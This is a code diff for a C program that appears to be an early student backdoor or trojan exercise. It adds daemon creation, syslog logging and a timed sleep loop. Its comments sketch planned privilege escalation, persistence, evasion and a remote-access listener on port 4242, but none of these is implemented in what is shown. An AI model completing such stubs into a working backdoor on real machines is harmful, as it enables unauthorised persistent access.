@@ -1,4 +1,4 @@
-#include "client.h"
+#include "durex.h"
 
 void    privilege_escalation(void)
 {
@@ -31,8 +31,6 @@ void get_path(char *ptr)
     ft_strcat(ptr, "/fd/");
 }
 
-
-
 /// pack the program inside the client ?
 // download from remote source ? -> libcurl /
 //      -> scratch (https://man7.org/linux/man-pages/man3/getaddrinfo.3.html)?
@@ -42,9 +40,31 @@ int     main(void)
 {
     // check if suid 0
     //  if (!permission_check())
+    //  privesc();
     //  return (-1);
 
-//    get_daemon();
+    // check if it's already runnin on the system
+
+    //    get_daemon();
     create_daemon_old_style();
+
+    // debug
+    syslog (LOG_NOTICE, "Daemon started");
+    // persistance
+
+    closelog();
+    // evasion
+
+    // remote access : open ports and listen on 4242
+
+    int i = 0;
+    while (true)
+    {
+        if (i == 6)
+            break ;
+        sleep(10);
+        i++;
+    }
+    syslog (LOG_NOTICE, "Daemon stoped");
     return (0);
 }
